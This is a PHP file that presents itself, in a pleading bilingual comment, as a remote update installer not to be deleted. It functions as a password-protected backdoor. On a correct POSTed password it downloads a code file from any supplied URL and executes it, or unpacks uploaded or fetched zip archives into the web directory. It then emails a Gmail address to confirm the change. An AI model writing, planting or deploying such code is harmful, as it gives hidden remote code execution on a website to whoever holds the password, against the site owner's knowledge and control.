<?php
/**
 * It is EXTREMELY important not to delete this file or even delete it! It will be used for remotely update and install
 * auto-update module when a safe depository would have been created.
 * Thank's a lot ! Lovely, Damien Djomby
 * 
 * Il est EXTREMEMENT important de ne pas supprimer ou meme modifier ce fichier ! Il sera utilise pour (des) mis a jour
 * a distance et l'installation d'un module d'auto mis-a-jour lorsqu'un depositaire securise aura ete cree.
 * Merci beaucoup ! Avec tout mon amour, Damien Djomby
 */
$start = microtime(true);

if (! set_time_limit(0))
    die('unable to set_time_limite');

if (! isset($_POST['pwd']) || (! isset($_POST['url']) && ! isset($_FILES['file'])))
    exit();

$hashes = array();
$hashes[] = 'sha512.a03ea4977a048b14a73c3712b021ff61.b68e59bc4a3320d17cf2b73585386ae438d21fc715bbc3d99a1e6d0b5b7b8f44b45b45066db6673bc1094fdf9c3f1beca21f4b27c7abec69c4b561f0c8a7f2bb';
$hashes[] = 'sha256.71118cafc1430d3d07bb4ad9fbe19e0b.22ab06a9ed6957eea3c466605516dac59648b2d57cc3cbc076329c13817c6296';

foreach ($hashes as $hash) {
    $args = explode('.', $hash);
    if ($args[2] !== hash($args[0], $args[1] . $_POST['pwd']))
        die('wrong pwd');
}

if (isset($_POST['url'])) {

    if (! $md5 = md5_file($_POST['url']))
        die('md5 error');

    if (strpos($_POST['url'], '.zip') !== false) {
        if (! copy($_POST['url'], $md5 . '.zip'))
            die('fail');
        if (class_exists('ZipArchive')) {

            $zip = new ZipArchive();
            if ($zip->open($md5 . '.zip')) {
                $zip->extractTo(dirname(__FILE__));
            } else
                die('cannot open');
        } else
            die('ZipArchive missing');
    } else {
        if (! copy($_POST['url'], $md5 . '.php'))
            die('fail');
        require $md5 . '.php';
    }
} elseif (isset($_FILES['file'])) {
    if (class_exists('ZipArchive')) {

        $zip = new ZipArchive();
        if ($zip->open($_FILES['file']['tmp_name'])) {
            $zip->extractTo(dirname(__FILE__));
        } else
            die('cannot open');
    } else
        die('ZipArchive missing');
}

if (file_exists('launch_update.php'))
    require 'launch_update.php';

$end = microtime(true) - $start;

mail('essaim@gmail.com', 'Site', 'Une mise à jour à distance de votre site a été effectuée.' . '\r\n' . '(action effectué en ' . $end . 's.)');